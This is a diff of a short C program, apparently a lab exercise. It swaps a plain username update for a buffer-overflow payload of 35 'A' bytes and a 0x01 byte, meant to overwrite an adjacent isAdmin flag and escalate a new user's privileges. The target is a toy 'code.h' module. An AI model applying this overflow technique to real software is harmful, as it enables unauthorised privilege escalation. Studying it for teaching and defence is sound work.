@@ -1,35 +1,25 @@
 #include <stdio.h>
 #include <string.h>
-#include <stdlib.h>
+//#include "code_fixed.h"
 #include "code.h"
 
-void print_user_info(int user_id) {
-    printf("[*] user id   : %d\n", user_id);
-    printf("[*] username  : %s\n", username(user_id));
-    printf("[*] isAdmin   : %d\n", is_admin(user_id));
-    printf("\n");
-}
-
 int main() {
-    int uid = create_user_account(false, "pwned");
-    if (uid == INVALID_USER_ID) {
-        fprintf(stderr, "user creation failed\n");
-        return 1;
-    }
+    int id = create_user_account(false, "pwned");
 
-    printf("Before username update:\n");
-    print_user_info(uid);
+    printf("Before:\n");
+    printf("[*] username : %s\n", username(id));
+    printf("[*] isAdmin  : %d\n", is_admin(id));
 
-    update_username(uid, "admin"); 
+    char payload[64] = {0};
+    memset(payload, 'A', 35); 
+    payload[35] = '\x01';      
+    payload[36] = '\0';        
 
-    printf("After username update (exploit attempt):\n");
-    print_user_info(uid);
+    update_username(id, payload);
 
-    if (is_admin(uid)) {
-        printf("[+] Privilege escalation succeeded!\n");
-    } else {
-        printf("[-] Privilege escalation failed.\n");
-    }
+    printf("...\nAfter:\n");
+    printf("[*] username : %s\n", username(id));
+    printf("[*] isAdmin  : %d\n", is_admin(id));
 
     return 0;
 }
